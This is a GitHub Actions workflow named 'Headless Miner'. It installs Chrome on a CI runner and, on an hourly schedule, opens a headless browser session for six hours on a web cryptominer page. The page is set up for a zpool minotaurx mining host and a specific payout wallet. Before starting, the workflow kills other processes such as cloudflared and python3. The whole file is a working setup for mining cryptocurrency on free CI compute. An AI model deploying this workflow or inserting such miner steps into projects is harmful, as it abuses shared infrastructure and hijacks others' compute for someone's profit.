name: Headless Miner

on:
  schedule:
    - cron: '0 * * * *'  # Hourly (adjust to '0 */6 * * *' for 6-hour runs to save minutes)
  workflow_dispatch:  # Manual trigger in UI

jobs:
  mine:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # Max 6 hours
    steps:
    - name: Install Chrome
      run: |
        sudo apt update
        wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
        echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google-chrome.list
        sudo apt update
        sudo apt install -y google-chrome-stable
    - name: Run Miner (Max 6 Hours)
      run: |
        pkill cloudflared || true
        pkill python3 || true
        pkill chrome || true
        google-chrome --no-sandbox --disable-dev-shm-usage --disable-gpu --headless --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-session "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=rKCEg38Nc13mWtRttZy26kaaW5JBkD95TK&password=c%3DRVN&workers=4" &
        sleep 21600  # 6 hours full run
